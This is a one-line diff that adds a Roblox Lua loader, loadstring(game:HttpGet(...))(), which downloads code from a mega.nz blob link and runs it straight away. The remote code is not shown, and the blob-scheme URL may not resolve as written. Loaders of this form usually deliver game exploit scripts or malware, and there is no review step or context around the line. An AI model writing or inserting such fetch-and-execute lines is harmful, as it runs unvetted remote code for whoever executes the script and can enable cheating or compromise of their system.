@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("blob:https://mega.nz/f35d657a-2828-433a-a324-efa71c3805f6"))()
